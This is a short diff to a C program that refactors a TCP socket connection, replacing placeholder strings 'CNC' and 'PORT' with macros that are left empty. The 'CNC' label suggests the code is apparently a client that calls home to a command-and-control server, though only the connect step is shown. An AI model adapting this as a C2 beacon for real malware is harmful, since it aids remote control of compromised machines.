@@ -5,6 +5,9 @@
 #include <unistd.h>
 #include <errno.h>
 
+#define IP
+#define PORT
+
 int main(int argc, char **argv)
 {
     struct sockaddr_in serveraddr;
@@ -14,8 +17,8 @@ int main(int argc, char **argv)
 
     server_sockfd = socket(AF_INET, SOCK_STREAM, 6);
     serveraddr.sin_family = AF_INET;
-    serveraddr.sin_addr.s_addr = inet_addr("CNC"); 
-    serveraddr.sin_port = htons(atoi("PORT"));
+    serveraddr.sin_addr.s_addr = inet_addr(IP); 
+    serveraddr.sin_port = htons(atoi(PORT));
     client_len = sizeof(serveraddr);
 
     connect(server_sockfd, (struct sockaddr*)&serveraddr, client_len);
